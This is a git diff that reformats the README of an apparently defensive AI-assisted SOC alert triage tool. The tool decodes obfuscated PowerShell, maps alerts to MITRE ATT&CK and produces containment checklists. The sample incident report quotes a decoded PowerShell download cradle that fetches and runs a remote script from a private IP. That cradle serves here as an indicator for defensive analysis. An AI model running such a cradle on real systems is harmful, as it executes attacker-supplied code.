@@ -33,30 +33,37 @@ An automated SecOps incident triage engine engineered in Python. This project au
    * Extracted Observables & IOC Table
    * Prioritized Containment & Isolation Checklist
    * Escalation & Investigation Recommendations
-Technical Highlights & Key Competencies
-Automated Payload Deobfuscation: Engineered automated regex parsing to detect and decode Base64 UTF-16LE obfuscated PowerShell command strings (-enc), exposing hidden download cradles and C2 IPs.
+```
 
-Adversary Mapping (MITRE ATT&CK): Automatically correlates raw endpoint indicators with specific MITRE ATT&CK techniques, tactics, and adversary objectives.
+---
 
-Structured Data Validation: Implemented Pydantic data schemas with LangChain to enforce strict JSON/Markdown output formatting from LLM reasoning chains.
+## Technical Highlights & Key Competencies
 
-Alert Fatigue Reduction: Transforms noisy raw SIEM event payloads into human-readable attack narratives and actionable triage playbooks in seconds.
+* **Automated Payload Deobfuscation:** Engineered automated regex parsing to detect and decode Base64 UTF-16LE obfuscated PowerShell command strings (`-enc`), exposing hidden download cradles and C2 IPs.
+* **Adversary Mapping (MITRE ATT&CK):** Automatically correlates raw endpoint indicators with specific MITRE ATT&CK techniques, tactics, and adversary objectives.
+* **Structured Data Validation:** Implemented Pydantic data schemas with LangChain to enforce strict JSON/Markdown output formatting from LLM reasoning chains.
+* **Alert Fatigue Reduction:** Transforms noisy raw SIEM event payloads into human-readable attack narratives and actionable triage playbooks in seconds.
+* **Incident Response Playbook Generation:** Automatically authors step-by-step containment checklists (host isolation, PID termination, token revocation) ready for SOC Tier-1 execution.
 
-Incident Response Playbook Generation: Automatically authors step-by-step containment checklists (host isolation, PID termination, token revocation) ready for SOC Tier-1 execution.
+---
 
-Visual Proof & Demonstration
-1. Automated CLI Triage Execution
+## Visual Proof & Demonstration
+
+### 1. Automated CLI Triage Execution
 The copilot processes multiple alerts in batch, performing real-time deobfuscation, MITRE mapping, and severity scoring:
 
-[cli-runner.png.png]
+![CLI Triage Execution](cli-runner.png.png)
 
-2. Generated SOC Incident Report
+### 2. Generated SOC Incident Report
 Standardized incident ticket output detailing severity metrics, attack narrative, observables, and containment action items:
 
-[incident-report-evidence.png.png]
+![Generated Incident Report](incident-report-evidence.png.png)
 
-Repository Structure
-Plaintext
+---
+
+## Repository Structure
+
+```text
 ai-soc-analyst-copilot/
 ├── alerts/
 │   ├── alert_encoded_powershell.json      # Sample input: Base64 obfuscated PowerShell attack
@@ -69,10 +76,15 @@ ai-soc-analyst-copilot/
 ├── main.py                                # CLI automation runner
 ├── cli-runner.png.png                     # Evidence: Terminal triage execution
 └── incident-report-evidence.png.png       # Evidence: Generated incident ticket
-Sample Incident Triage Output
-Below is an excerpt from a generated report (reports/INCIDENT_SEC-ALERT-2026-002.md):
+```
 
-Markdown
+---
+
+## Sample Incident Triage Output
+
+Below is an excerpt from a generated report (`reports/INCIDENT_SEC-ALERT-2026-002.md`):
+
+```markdown
 # SOC Incident Triage Report: SEC-ALERT-2026-002
 
 **Timestamp:** 2026-10-10T07:42:01Z  
@@ -87,46 +99,42 @@ This activity maps to MITRE ATT&CK T1059.001.
 ## 2. Extracted Observables & IOCs
 * **process_name:** `powershell.exe`
 * **parent_process:** `explorer.exe`
-* **decoded_payload:** `IEX (New-Object Net.WebClient).DownloadString('[http://192.168.1.100:8080/secret.ps1](http://192.168.1.100:8080/secret.ps1)')`
+* **decoded_payload:** `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/secret.ps1')`
 * **extracted_ips:** `['192.168.1.100']`
 
 ## 3. Recommended Containment Checklist
 - [ ] Isolate endpoint 'vm-windows-target' from the corporate network immediately.
 - [ ] Terminate offending PowerShell process PID and block extracted C2 IP: 192.168.1.100.
 - [ ] Revoke active session tokens for user 'azureuser' and initiate credential reset.
-Getting Started & Execution
-Prerequisites
-Python 3.10+
-
-Virtual Environment (venv)
-
-Installation & Run
-Clone the repository:
-
-Bash
-git clone [https://github.com/ravishkarathnayaka/ai-soc-analyst-copilot.git](https://github.com/ravishkarathnayaka/ai-soc-analyst-copilot.git)
-cd ai-soc-analyst-copilot
-Set up virtual environment:
-
-Bash
-python -m venv venv
-source venv/bin/activate  # On Windows: .\venv\Scripts\Activate.ps1
-pip install pydantic python-dotenv langchain langchain-google-genai requests
-Run the triage engine:
-
-Bash
-python main.py
-View generated reports:
-Generated triage reports are automatically saved as Markdown files in the reports/ folder.
-
+```
 
 ---
 
-### How to Add It to Your Repository:
+## Getting Started & Execution
 
-1. On your **`ai-soc-analyst-copilot`** GitHub tab (`image_f435dc.png`), click the green button in the center:
-   > **`Add a README`**
-2. Paste the copied Markdown into the editor.
-3. Click the green **Commit changes...** button at the top right.
+### Prerequisites
+* Python 3.10+
+* Virtual Environment (`venv`)
 
-Both of your evidence screenshots (`cli-runner.png.png` and `incident-report-evidence.png.png`)
+### Installation & Run
+
+1. **Clone the repository:**
+   ```bash
+   git clone https://github.com/ravishkarathnayaka/ai-soc-analyst-copilot.git
+   cd ai-soc-analyst-copilot
+   ```
+
+2. **Set up virtual environment:**
+   ```bash
+   python -m venv venv
+   source venv/bin/activate  # On Windows: .\venv\Scripts\Activate.ps1
+   pip install pydantic python-dotenv langchain langchain-google-genai requests
+   ```
+
+3. **Run the triage engine:**
+   ```bash
+   python main.py
+   ```
+
+4. **View generated reports:**
+   Generated triage reports are automatically saved as Markdown files in the `reports/` folder.
